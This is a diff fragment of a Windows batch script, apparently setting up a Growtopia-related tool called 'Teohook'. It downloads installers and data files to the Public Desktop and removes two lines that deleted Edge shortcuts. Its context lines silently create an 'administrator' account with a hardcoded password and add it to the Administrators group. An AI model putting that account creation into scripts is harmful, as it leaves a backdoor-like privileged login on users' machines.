@@ -17,8 +17,6 @@ curl -o "C:\Users\Public\Desktop\Teohook Setup\VPN\Hide.Me-Setup.exe" https://hi
 curl -o "C:\Users\Public\Desktop\Teohook Setup\Latest GT\Latest Growtopia.exe" https://ubistatic-a.akamaihd.net/0098/31789/GrowtopiaInstaller.exe > out.txt 2>&1
 curl -o "C:\Users\Public\Desktop\Teohook Setup\Important\items.dat" https://raw.githubusercontent.com/OnurCreed/secretsource/main/items.dat > out.txt 2>&1
 curl -o "C:\Users\Public\Desktop\Teohook Setup\Important\crashfix.txt" https://raw.githubusercontent.com/OnurCreed/secretsource/main/crashfix.txt > out.txt 2>&1
-del /f "C:\Users\Public\Desktop\Microsoft Edge.lnk"
-del /f "C:\Users\administrator\Desktop\Microsoft Edge.lnk"
 net user administrator capci@1234 /add >nul
 net localgroup administrators administrator /add >nul
 net user administrator /active:yes >nul
